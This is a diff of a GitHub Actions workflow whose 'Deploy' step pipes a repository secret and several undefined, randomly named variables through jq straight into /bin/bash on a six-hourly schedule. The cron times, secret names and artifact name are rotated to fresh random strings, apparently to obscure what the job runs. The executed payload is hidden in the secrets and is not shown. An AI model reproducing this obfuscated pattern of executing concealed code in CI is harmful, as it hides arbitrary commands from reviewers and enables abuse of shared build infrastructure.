@@ -3,7 +3,7 @@ on:
   workflow_dispatch:
 
   schedule:
-    - cron: '19 0,6,12,18 * * *'
+    - cron: '14 2,8,14,20 * * *'
 permissions:
   contents: read
 jobs:
@@ -16,18 +16,18 @@ jobs:
           fetch-depth: 1
       - name: Deploy
         env:
-          tl50672: ${{ secrets.tl50672 }}
+          g82590: ${{ secrets.g82590 }}
         run: |
-          printf '%s' "$tl50672" | jq -r .izzsy12 | /bin/bash
-          echo $tqqmy86 | jq -r .dsvd7570 | /bin/bash
-          printf '%s' "$eljbz8455" | jq -r .hnwt61035 | /bin/bash
-          printf '%s' "$na2" | jq -r .d29135 | /bin/bash
-          printf '%s' "$v10468" | jq -r .p4 | /bin/bash
-          printf '%s' "$tz2" | jq -r .h10775 | /bin/bash
+          printf '%s' "$g82590" | jq -r .foutt13 | /bin/bash
+          printf '%s' "$j063" | jq -r .ij2 | /bin/bash
+          printf '%s' "$t6" | jq -r .p4 | /bin/bash
+          printf '%s' "$drllh1079" | jq -r .tzpa2 | /bin/bash
+          printf '%s' "$yubyw7343" | jq -r .tig2847 | /bin/bash
+          echo $sbo9 | jq -r .cxlw61 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
         with:
-          name: zi0fpX2N
+          name: Qt50BHM6
           path: "*.zip"
           retention-days: 1
